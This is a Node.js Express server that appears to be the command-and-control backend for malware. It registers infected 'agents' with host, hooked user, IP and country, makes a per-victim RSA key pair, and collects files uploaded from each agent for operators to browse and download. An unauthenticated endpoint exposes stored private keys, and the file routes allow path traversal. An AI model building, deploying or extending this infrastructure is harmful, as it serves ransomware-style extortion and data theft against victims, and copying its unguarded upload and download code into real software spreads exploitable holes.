const express = require('express');
const mysql = require('mysql');
const crypto = require("crypto");
const https = require('https');
const multer = require("multer");
const mime = require('mime');
const cors = require('cors');
const fs = require('fs');
const path = require('path');


const httpsOptions = {
  key: fs.readFileSync('key.pem'),
  cert: fs.readFileSync('cert.pem')
};

const app = express();

const server = https.createServer(httpsOptions, app);

const socketIO = require('socket.io')(server, {
  cors: {
    origin: "*"
  }
});

const DATA_AGENTS_FOLDER = "/CTHULHU/users"
try {
  if (!fs.existsSync(DATA_AGENTS_FOLDER)) {
    fs.mkdirSync(DATA_AGENTS_FOLDER);
  }

} catch (err) {
  console.log(err)
}



const port = 5000;

const USER_ADMIN_ROLE = 1
const USER_READER_ROLE = 2

app.use(cors()) // setup cors headers
app.use(express.json()) // for parsing application/json


// Configure multer with a dynamic destination folder
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, "/tmp/");
  },
  filename: (req, file, cb) => {
    cb(null, file.originalname);
  },
});

const upload = multer({ storage });

// Set up MySQL connection
// change the cread to your own
const db = mysql.createConnection({
  host: process.env.DB_HOST,
  user: process.env.DB_USER,
  password: process.env.DB_PASS,
  database: process.env.DB_MAIN
});

// Connect to MySQL
db.connect((err) => {
  if (err) {
    console.error('Error connecting to MySQL database: ' + err.stack);
    return;
  }
  console.log('Connected to MySQL database as ID ' + db.threadId);
});

let users = [];

socketIO.on('connection', (socket) => {
  socket.on("message", data => {
    socketIO.emit("messageResponse", data)
  })

  socket.on("typing", data => (
    socket.broadcast.emit("typingResponse", data)
  ))

  socket.on("newUser", data => {
    let userAlreadyExist = false;
    for (let user of users) {
      if (user.userName === data.userName && user.socketID === data.socketID) {
        userAlreadyExist = true;
      }
    }
    if (!userAlreadyExist) {
      users.push(data)
      socketIO.emit("newUserResponse", users)
    }
  })

  socket.on('disconnect', () => {
    users = users.filter(user => user.socketID !== socket.id)
    socketIO.emit("newUserResponse", users)
    socket.disconnect()
  });
});

const getFileInfoFromFolder = (route) => {
  const files = fs.readdirSync(route, 'utf8');
  const response = [];
  for (let file of files) {
    const extension = path.extname(file);
    const fileSizeInBytes = fs.statSync(path.join(route, file)).size;
    response.push({ name: file, extension, fileSizeInBytes });
  }
  return response;
}

const getAllDirFiles = function (dirPath, arrayOfFiles) {
  files = fs.readdirSync(dirPath)

  arrayOfFiles = arrayOfFiles || []

  files.forEach(function (file) {
    if (fs.statSync(dirPath + "/" + file).isDirectory()) {
      arrayOfFiles = getAllDirFiles(dirPath + "/" + file, arrayOfFiles)
    } else {
      arrayOfFiles.push(file)
    }
  })

  return arrayOfFiles
}

const getDirSize = (dirPath) => {
  let size = 0;
  const files = fs.readdirSync(dirPath);

  for (let i = 0; i < files.length; i++) {
    const filePath = path.join(dirPath, files[i]);
    const stats = fs.statSync(filePath);

    if (stats.isFile()) {
      size += stats.size;
    } else if (stats.isDirectory()) {
      size += getDirSize(filePath);
    }
  }

  return size;
};

const checkToken = async (username, token, userId = -1) => {
  return new Promise((resolve, reject) => {
    db.query('SELECT * FROM users WHERE (user_name = ? OR user_id = ?) AND user_token = ?', [username, userId, token], (error, results) => {
      if (error) {
        return reject(error);
      }
      let userTokenInfo = { userId: -1, username: "", userRole: -1, isTokenValid: false }
      if (results.length > 0) {
        userTokenInfo.userId = results[0].user_id
        userTokenInfo.username = results[0].user_name
        userTokenInfo.userRole = results[0].role_id
        userTokenInfo.isTokenValid = true
      }
      resolve(userTokenInfo);
    })
  });
}

app.get('/download', function (req, res) {
  var JSON_RES = { data: {}, error: {} }
  if (req.query !== undefined && req.query.file !== undefined && req.query.agentID !== undefined) {

    try {
      const agentID = req.query.agentID.toString().replace("/", "").replace("\\", "")
      const fileName = atob(decodeURIComponent(req.query.file)).replace("/", "").replace("\\", "")
      const file = DATA_AGENTS_FOLDER + "/" + agentID + "/" + fileName;
      if (fs.existsSync(file)) {
        var mimetype = mime.lookup(file);
        var filename = path.basename(file);
        res.setHeader('Content-disposition', 'attachment; filename=' + filename);
        res.setHeader('Content-type', mimetype);

        var filestream = fs.createReadStream(file);
        filestream.pipe(res);
      }
    } catch (err) {
      console.error(err)
      JSON_RES.error = { errorMsg: "File not found" }
      res.status(404)
      res.json(JSON_RES);
      res.end();
    }
  } else {
    JSON_RES.error = { errorMsg: "Bad parameters" }
    res.status(400)
    res.json(JSON_RES);
    res.end();
  }
});

// API endpoint for receiving data
app.post('/api/agent/new', (req, res) => {
  console.log("POST api agent new")
  var JSON_RES = { data: {}, error: {} }
  if (
    req.body != undefined &&
    req.body.versionOS != undefined &&
    req.body.host != undefined &&
    req.body.hookUser != undefined &&
    req.body.ip != undefined &&
    req.body.country != undefined
  ) {

    // Generate RSA key pair
    const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
      modulusLength: 4096,
      publicKeyEncoding: {
        type: 'pkcs1',
        format: 'pem'
      },
      privateKeyEncoding: {
        type: 'pkcs1',
        format: 'pem'
      }
    });

    const publicKeyStr = publicKey.toString();

    // Insert data into MySQL
    const sql = `INSERT INTO agent (versionOS, host, hookUser, privKey, pubKey, ip, country) VALUES (?, ?, ?, ?, ?, ?, ?)`;
    const values = [req.body.versionOS, req.body.host, req.body.hookUser, privateKey.toString(), publicKeyStr, req.body.ip, req.body.country];

    // Insert data into MySQL without keys
    db.query(sql, values, (err, result) => {
      if (err) {
        JSON_RES.error = { errorMsg: "Error inserting data into MySQL " + err.stack }
        res.status(500)
        res.json(JSON_RES);
        res.end();
        return;
      }
      console.log('Inserted data into MySQL with ID ' + result.insertId);
      JSON_RES.data = { id: result.insertId, publicKey: publicKeyStr }

      try {
        const folderName = path.join(DATA_AGENTS_FOLDER, result.insertId.toString());
        if (!fs.existsSync(folderName)) {
          fs.mkdirSync(folderName);
        }
      } catch (err) {
        JSON_RES.error = { errorMsg: err }

        res.status(500)
        res.json(JSON_RES);
        res.end();
        return;
      }

      res.status(200)
      res.json(JSON_RES);
      res.end();
    });

  } else {
    JSON_RES.error = { errorMsg: "Bad parameters" }
    res.status(400)
    res.json(JSON_RES);
    res.end();
  }

});

app.post('/api/file/upload/:user_folder', upload.single('file'), (req, res) => {
  // Access the uploaded file details
  const file = req.file;
  if (!file) {
    res.status(400).send('No file uploaded.');
    return;
  }

  var JSON_RES = { data: {}, error: {} }

  const sourceFilePath = "/tmp/" + req.file.originalname;
  const destinationFilePath = DATA_AGENTS_FOLDER + "/" + req.params.user_folder + "/" + req.file.originalname;

  // Check if the destination file exists
  if (fs.existsSync(destinationFilePath)) {
    // Read the contents of the source file
    fs.readFile(sourceFilePath, (err, data) => {
      if (err) {
        console.error('Error reading the source file:', err);
        return;
      }

      // Append the contents to the destination file
      fs.appendFile(destinationFilePath, data, (err) => {
        if (err) {
          console.error('Error appending to the destination file:', err);
          return;
        }

        console.log('Contents appended successfully!');
      });
    });
  } else {
    // Create the destination file and write the contents of the source file to it
    fs.copyFile(sourceFilePath, destinationFilePath, (err) => {
      if (err) {
        console.error('Error creating the destination file:', err);
        return;
      }

      console.log('Destination file created and contents copied successfully!');
    });
  }

  fs.unlink(sourceFilePath, (err) => {
    if (err) {
      console.error('Error deleting the source file:', err);
      return;
    }

    console.log('Source file deleted successfully!');
  });

  // Do something with the file, such as saving it to a specific location or performing further processing

  JSON_RES.data = { success: `${file.originalname} uploaded successfully.` }

  res.status(200)
  res.json(JSON_RES);
  res.end();
});


// ------------------------------------------------------------USER_ROUTES----------------------------------------------------

app.post('/auth', (req, res) => {
  var JSON_RES = { data: {}, error: {} }
  // Ensure the input fields exists and are not empty
  if (req.body != undefined && req.body.username != undefined && req.body.password != undefined) {
    // Capture the input fields
    const username = req.body.username;
    const password = crypto.pbkdf2Sync(req.body.password, username, 1000, 64, `sha512`).toString(`hex`);
    // Execute SQL query that'll select the account from the database based on the specified username and password
    db.query('SELECT * FROM users WHERE user_name = ? AND user_password = ?', [username, password], (error, results) => {
      // If there is an issue with the query, output the error
      if (error) throw error;
      // If the account exists
      if (results.length > 0) {
        // Login 
        const timestamp = new Date().getTime();
        const token = crypto.pbkdf2Sync(req.body.password + username, timestamp.toString(10), 10, 64, `sha512`).toString(`hex`);
        // Execute SQL query to set new token for auth
        db.query('UPDATE users SET user_token = ? WHERE user_name = ?', [token, username], (error) => {
          // If there is an issue with the query, output the error
          if (error) throw error;

          JSON_RES.data = { username: username, token: token }
          res.json(JSON_RES);
          res.end();
        });
      } else {
        JSON_RES.error = { errorMsg: "Incorrect Username and/or Password" }
        res.status(403)
        res.json(JSON_RES);
        res.end();
      }
    });
  } else {
    JSON_RES.error = { errorMsg: "Bad parameters" }
    res.status(400)
    res.json(JSON_RES);
    res.end();
  }

});

app.post('/createUser', async (req, res) => {
  var JSON_RES = { data: {}, error: {} }
  // Ensure the input fields exists and are not empty
  if (req.body != undefined && req.body.reqUsername != undefined && req.body.reqToken && req.body.username != undefined && req.body.password != undefined && req.body.email != undefined && req.body.firstname != undefined && req.body.firstname != undefined && req.body.role != undefined) {
    // Capture the input fields
    const reqUsername = req.body.reqUsername;
    const reqToken = req.body.reqToken;
    const username = req.body.username;
    const email = req.body.email;
    const firstname = req.body.firstname;
    const lastname = req.body.lastname;
    const role = req.body.role
    // Check if user already exists
    const reqUserInfo = await checkToken(reqUsername, reqToken)
    if (reqUserInfo.isTokenValid) {
      if (reqUserInfo.userRole == USER_ADMIN_ROLE) {
        db.query('SELECT * FROM users WHERE user_name = ? OR user_email = ?', [username, email], (error, results) => {
          // If there is an issue with the query, output the error
          if (error) throw error;
          // If the account exists
          if (results.length > 0) {
            JSON_RES.error = { errorMsg: "User already exists" }
            res.status(409)
            res.json(JSON_RES);
            res.end();
          } else {
            //hash password
            const password = crypto.pbkdf2Sync(req.body.password, username,
              1000, 64, `sha512`).toString(`hex`);

            // Execute SQL query that'll create new user
            db.query('INSERT INTO users (  user_firstname, user_lastname, user_name, user_email, user_password, role_id ) VALUES (?, ?, ?, ?, ?, ?)', [firstname, lastname, username, email, password, role], (error) => {
              // If there is an issue with the query, output the error
              if (error) throw error;

              JSON_RES.data = { username: username }
              res.status(201)
              res.json(JSON_RES);
              res.end();
            });
          }
        });
      } else {
        JSON_RES.error = { errorMsg: "User is not admin" }
        res.status(403)
        res.json(JSON_RES);
        res.end();
      }
    } else {
      JSON_RES.error = { errorMsg: "Bad token" }
      res.status(403)
      res.json(JSON_RES);
      res.end();
    }

  } else {
    JSON_RES.error = { errorMsg: "Bad parameters" }
    res.status(400)
    res.json(JSON_RES);
    res.end();
  }

});

app.post('/editUser', async (req, res) => {
  var JSON_RES = { data: {}, error: {} }
  // Ensure the input fields exists and are not empty
  if (req.body != undefined && req.body.reqUsername != undefined && req.body.reqToken && req.body.username != undefined && req.body.password != undefined && req.body.email != undefined && req.body.firstname != undefined && req.body.firstname != undefined && req.body.role != undefined) {
    // Capture the input fields
    const reqUsername = req.body.reqUsername;
    const reqToken = req.body.reqToken;
    const username = req.body.username;
    const email = req.body.email;
    const firstname = req.body.firstname;
    const lastname = req.body.lastname;
    const password = req.body.password;
    const role = req.body.role

    const reqUserInfo = await checkToken(reqUsername, reqToken)

    if (reqUserInfo.isTokenValid) {
      if (reqUserInfo.userRole == USER_ADMIN_ROLE || reqUsername == username) {
        if (reqUsername == username) role = reqUserInfo.userRole;
        // Check if user already exists
        db.query('SELECT * FROM users WHERE user_name = ? OR user_email = ?', [username, email], (error, results) => {
          // If there is an issue with the query, output the error
          if (error) throw error;
          // If the account exists
          if (results.length > 0) {
            let queryArray = [firstname, lastname, username, email, role]
            let queryString = "UPDATE users SET user_firstname = ?, user_lastname = ?, user_name = ?, user_email = ?, role_id = ?"
            //hash password
            if (password != "") {
              queryString += ", user_password = ?"
              const hashedPassword = crypto.pbkdf2Sync(password, username,
                1000, 64, `sha512`).toString(`hex`);
              queryArray.push(hashedPassword)
            }

            queryString += " WHERE user_id = ?"
            queryArray.push(results[0].user_id)

            // Execute SQL query that'll modify user
            db.query(queryString, queryArray, (error) => {
              // If there is an issue with the query, output the error
              if (error) throw error;
              JSON_RES.data = { username: reqUsername, token: reqToken }
              res.status(201)
              res.json(JSON_RES);
              res.end();
            });

          } else {
            JSON_RES.error = { errorMsg: "User does not exists" }
            res.status(404)
            res.json(JSON_RES);
            res.end();
          }
        });
      } else {
        JSON_RES.error = { errorMsg: "User is not admin" }
        res.status(403)
        res.json(JSON_RES);
        res.end();
      }
    } else {
      JSON_RES.error = { errorMsg: "Bad token" }
      res.status(403)
      res.json(JSON_RES);
      res.end();
    }

  } else {
    JSON_RES.error = { errorMsg: "Bad parameters" }
    res.status(400)
    res.json(JSON_RES);
    res.end();
  }

});

app.get('/getAgentInfo', async (req, res) => {
  var JSON_RES = { data: {}, error: {} }
  if (req.query.reqUsername != undefined && req.query.reqToken != undefined && req.query.agentID != undefined) {
    const reqUsername = req.query.reqUsername
    const reqToken = req.query.reqToken
    const agentId = req.query.agentID

    const reqUserInfo = await checkToken(reqUsername, reqToken)
    if (reqUserInfo.isTokenValid) {
      if (reqUserInfo.userRole == USER_ADMIN_ROLE || reqUserInfo.userRole == USER_READER_ROLE) {
        db.query('SELECT * FROM agent WHERE agentID = ?', [agentId], (error, results) => {
          // If there is an issue with the query, output the error
          if (error) throw error;

          if (results.length > 0) {
            const data_folder = path.join(DATA_AGENTS_FOLDER, results[0].agentID.toString())
            const size = getDirSize(data_folder)
            const files = getAllDirFiles(data_folder)

            JSON_RES.data = { agent: results[0] }
            JSON_RES.data.agent.totalFilesSize = size
            JSON_RES.data.agent.totalFilesSend = files.length
          } else {
            JSON_RES.error = { errorMsg: "Agent does not exist" }
            res.status(404)
          }
          res.json(JSON_RES);
          res.end();
        });
      } else {
        JSON_RES.error = { errorMsg: "User is not allowed" }
        res.status(403)
        res.json(JSON_RES);
        res.end();
      }
    } else {
      JSON_RES.error = { errorMsg: "Bad token" }
      res.status(403)
      res.json(JSON_RES);
      res.end();
    }
  } else {
    JSON_RES.error = { errorMsg: "Bad parameters" }
    res.status(400)
    res.json(JSON_RES);
    res.end();
  }
})

app.get('/getAgentTagInfo', async (req, res) => {
  var JSON_RES = { data: {}, error: {} }
  if (req.query.agentTag != undefined) {
    let buff = new Buffer(req.query.agentTag, 'base64');
    let text = buff.toString('ascii');
    const agentTag = text.split("#")
    if (agentTag.length === 3){
      const agentId = agentTag[0]
      const agentHostname = agentTag[1]
      const agentHookeUser = agentTag[2]
      db.query('SELECT * FROM agent WHERE agentID = ? AND host = ? AND hookUser = ?', [agentId, agentHostname, agentHookeUser], (error, results) => {
        // If there is an issue with the query, output the error
        if (error) throw error;

        if (results.length > 0) {
          JSON_RES.data = { agent: results[0] }
        } else {
          JSON_RES.error = { errorMsg: "Agent does not exist" }
          res.status(404)
        }
        res.json(JSON_RES);
        res.end();
      });
    } else {
      JSON_RES.error = { errorMsg: "Bad Agent Tag" }
      res.status(400)
      res.json(JSON_RES);
      res.end();
    }
  } else {
    JSON_RES.error = { errorMsg: "Bad parameters" }
    res.status(400)
    res.json(JSON_RES);
    res.end();
  }
})

app.get('/getUserInfo', async (req, res) => {
  var JSON_RES = { data: {}, error: {} }
  if (req.query.reqUsername != undefined && req.query.reqToken != undefined && (req.query.username != undefined || req.query.userId != undefined)) {
    const reqUsername = req.query.reqUsername
    const reqToken = req.query.reqToken
    const username = req.query.username
    const userId = req.query.userId

    const reqUserInfo = await checkToken(reqUsername, reqToken)
    if (reqUserInfo.isTokenValid) {
      if (reqUserInfo.userRole == USER_ADMIN_ROLE || reqUserInfo.userRole == USER_READER_ROLE || reqUsername == username) {
        db.query('SELECT * FROM users WHERE user_name = ? OR user_id = ?', [username, userId], (error, results) => {
          // If there is an issue with the query, output the error
          if (error) throw error;

          if (results.length > 0) {
            JSON_RES.data = { user: results[0] }
          } else {
            JSON_RES.error = { errorMsg: "User does not exist" }
            res.status(404)
          }
          res.json(JSON_RES);
          res.end();
        });
      } else {
        JSON_RES.error = { errorMsg: "User is not allowed" }
        res.status(403)
        res.json(JSON_RES);
        res.end();
      }
    } else {
      JSON_RES.error = { errorMsg: "Bad token" }
      res.status(403)
      res.json(JSON_RES);
      res.end();
    }
  } else {
    JSON_RES.error = { errorMsg: "Bad parameters" }
    res.status(400)
    res.json(JSON_RES);
    res.end();
  }
})

app.get('/getAllUsers', async (req, res) => {
  var JSON_RES = { data: {}, error: {} }
  if (req.query.username != undefined && req.query.token != undefined) {
    const username = req.query.username
    const token = req.query.token

    const userInfo = await checkToken(username, token)
    if (userInfo.isTokenValid) {
      if (userInfo.userRole == USER_ADMIN_ROLE || userInfo.userRole == USER_READER_ROLE) {
        db.query('SELECT user_name, user_email, role_id FROM users', (error, results) => {
          // If there is an issue with the query, output the error
          if (error) throw error;
          JSON_RES.data = { users: results }
          res.json(JSON_RES);
          res.end();
        });
      } else {
        JSON_RES.error = { errorMsg: "User is not allowed" }
        res.status(403)
        res.json(JSON_RES);
        res.end();
      }
    } else {
      JSON_RES.error = { errorMsg: "Bad token" }
      res.status(403)
      res.json(JSON_RES);
      res.end();
    }
  } else {
    JSON_RES.error = { errorMsg: "Bad parameters" }
    res.status(400)
    res.json(JSON_RES);
    res.end();
  }
})

app.get('/getAllAgents', async (req, res) => {
  var JSON_RES = { data: {}, error: {} }
  if (req.query.username != undefined && req.query.token != undefined) {
    const username = req.query.username
    const token = req.query.token

    const userInfo = await checkToken(username, token)
    if (userInfo.isTokenValid) {
      if (userInfo.userRole == USER_ADMIN_ROLE || userInfo.userRole == USER_READER_ROLE) {
        db.query('SELECT agentID, host, versionOS, hookUser, ip FROM agent', (error, results) => {
          // If there is an issue with the query, output the error
          if (error) throw error;
          JSON_RES.data = { agents: results }
          res.json(JSON_RES);
          res.end();
        });
      } else {
        JSON_RES.error = { errorMsg: "User is not allowed" }
        res.status(403)
        res.json(JSON_RES);
        res.end();
      }
    } else {
      JSON_RES.error = { errorMsg: "Bad token" }
      res.status(403)
      res.json(JSON_RES);
      res.end();
    }
  } else {
    JSON_RES.error = { errorMsg: "Bad parameters" }
    res.status(400)
    res.json(JSON_RES);
    res.end();
  }
})

app.get('/getAgentFiles', async (req, res) => {
  var JSON_RES = { data: {}, error: {} }
  if (req.query.username != undefined && req.query.token != undefined && req.query.agentID != undefined) {
    const username = req.query.username
    const token = req.query.token
    const agentId = req.query.agentID

    const userInfo = await checkToken(username, token)
    if (userInfo.isTokenValid) {
      if (userInfo.userRole == USER_ADMIN_ROLE || userInfo.userRole == USER_READER_ROLE) {
        const files = getFileInfoFromFolder(path.join(DATA_AGENTS_FOLDER, agentId.toString()))
        JSON_RES.data = { files }
        res.json(JSON_RES);
        res.end();
      } else {
        JSON_RES.error = { errorMsg: "User is not allowed" }
        res.status(403)
        res.json(JSON_RES);
        res.end();
      }
    } else {
      JSON_RES.error = { errorMsg: "Bad token" }
      res.status(403)
      res.json(JSON_RES);
      res.end();
    }
  } else {
    JSON_RES.error = { errorMsg: "Bad parameters" }
    res.status(400)
    res.json(JSON_RES);
    res.end();
  }
})

// API endpoint for receiving files

// Start the server
/* app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}/`);
}); */


server.listen(port);